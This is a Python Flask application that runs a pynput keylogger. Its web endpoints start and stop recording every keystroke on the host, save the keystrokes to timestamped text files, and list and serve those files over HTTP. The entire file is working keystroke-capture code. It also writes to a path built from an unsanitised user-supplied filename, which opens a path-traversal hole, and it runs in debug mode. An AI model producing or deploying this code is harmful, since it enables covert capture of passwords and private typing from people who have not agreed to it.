import os
import time
from threading import Thread
from flask import Flask, request, jsonify, render_template, send_from_directory

from pynput import keyboard

app = Flask(__name__)

LOG_DIR = "logs"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

log_file = None
listener = None 
keys_logged = []

def generate_filename():
    timestamp = time.strftime("%Y%m%d-%H%M%S")
    return f"keylog_{timestamp}.txt"

def on_press(key):
    global keys_logged
    try:
        keys_logged.append(key.char)
    except AttributeError:
        keys_logged.append(f" {str(key)} ")

def start_keylogger():
    global listener, log_file, keys_logged
    keys_logged = []
    log_file = generate_filename()
    listener = keyboard.Listener(on_press=on_press)
    Thread(target=listener.start, daemon=True).start()

def stop_keylogger(filename=None):
    global listener, keys_logged
    if listener:
        listener.stop()
        listener = None

        if filename:
            log_file = os.path.join(LOG_DIR, f"{filename}.txt")
        else:
            log_file = os.path.join(LOG_DIR, generate_filename())

        with open(log_file, "w") as f:
            f.write("".join(keys_logged))

        keys_logged = []

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/start", methods=["POST"])
def start():
    start_keylogger()
    return jsonify({"status": "Keylogger started"})

@app.route("/stop", methods=["POST"])
def stop():
    user_filename = request.json.get("filename", None)
    stop_keylogger(user_filename)
    return jsonify({"status": "Keylogger stopped"})

@app.route("/files", methods=["GET"])
def list_files():
    txt_files = [f for f in os.listdir(LOG_DIR) if f.endswith(".txt")]
    return jsonify(txt_files)

@app.route("/logs/<filename>")
def get_file(filename):
    return send_from_directory(LOG_DIR, filename)

if __name__ == "__main__":
    app.run(debug=True, port=5000)
